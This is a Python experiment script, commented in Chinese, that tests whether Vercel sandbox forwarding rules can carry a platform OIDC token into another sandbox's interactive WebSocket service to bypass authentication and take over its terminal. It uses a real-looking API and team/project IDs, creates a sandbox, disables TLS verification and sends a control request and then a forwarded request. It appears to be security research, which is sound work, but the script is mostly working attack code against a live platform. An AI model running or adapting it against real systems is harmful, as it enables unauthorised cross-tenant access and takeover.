# 实验K7: forwardURL -> 他沙箱 interactive 服务 — OIDC token 跨沙箱认证验证
# 前置: 沙箱B(expk7b) interactive URL = wss://sb-19q7g768dw0h.vercel.run/ws/interactive (本地直连 401 unauthorized)
# 假设: interactive 服务信任 vercel-sandbox-oidc-token 头(aud=forwardURL 用户可控) -> 跨沙箱终端接管
# 流程: 建A -> 直连对照(401?) -> 配 forwardRule(触发域=B域, path=/ws/interactive, fwd=B根) -> 再请求(带OIDC头)
# 判定: 再请求 非401(200/400/101) = OIDC 被 interactive 接受 = 认证绕过成立
import json, base64, pathlib, urllib.request, urllib.error, time

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=60):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

B_URL = "sb-19q7g768dw0h.vercel.run"   # 沙箱B的 interactive 主机
B_PATH = "/ws/interactive"

NAME = "expk7a"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": [B_URL]}})
print("create A:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid A:", sid)

# 沙箱内请求代码: 直连(对照) + forward后(实验)
PROBE = """
import urllib.request, urllib.error, ssl, json
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(label, url, method="GET", headers=None):
    rq = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        r = urllib.request.urlopen(rq, context=ctx, timeout=15)
        print(f"[{label}] HTTP {r.status} HEADERS={dict(r.headers)}", flush=True)
        print(f"[{label}] BODY={r.read(600)!r}", flush=True)
    except urllib.error.HTTPError as e:
        print(f"[{label}] HTTP {e.code} HEADERS={dict(e.headers)}", flush=True)
        print(f"[{label}] BODY={e.read(600)!r}", flush=True)
    except Exception as e:
        print(f"[{label}] EXC {type(e).__name__}: {e}", flush=True)

U = "https://__B_URL____B_PATH__"
req("DIRECT-CTRL", U)
req("DIRECT-CTRL-GET", U, method="GET")
""".replace("__B_URL__", B_URL).replace("__B_PATH__", B_PATH)
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
           {"command": "python3", "args": ["-c", PROBE],
            "wait": True, "logs": True, "timeout": 60000})
print("=== DIRECT 对照 status", c, "===", flush=True)
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            print(d.get("data", ""), end="", flush=True)
    except Exception:
        print(line[:400], flush=True)

# 配 forwardRule: 触发域=B域, path exact /ws/interactive, forwardURL=B根(aud=无路径)
fwd = "https://%s" % B_URL
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
           {"allow": {B_URL: [{"match": {"path": {"exact": B_PATH}},
                               "forwardURL": fwd}]}})
print("\n=== forwardRule 配置:", c, r[:300], "===", flush=True)
time.sleep(3)

# forward 后请求同 URL (走代理 -> 带 vercel-sandbox-oidc-token 头)
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
           {"command": "python3", "args": ["-c", PROBE],
            "wait": True, "logs": True, "timeout": 60000})
print("=== FORWARD 实验 status", c, "===", flush=True)
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            print(d.get("data", ""), end="", flush=True)
        elif d.get("stream") == "command":
            print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
    except Exception:
        print(line[:400], flush=True)

# 不清理 A, 保留供后续变体(路径/aud 变体)测试
print("\nA 保留 (后续变体测试用)", flush=True)
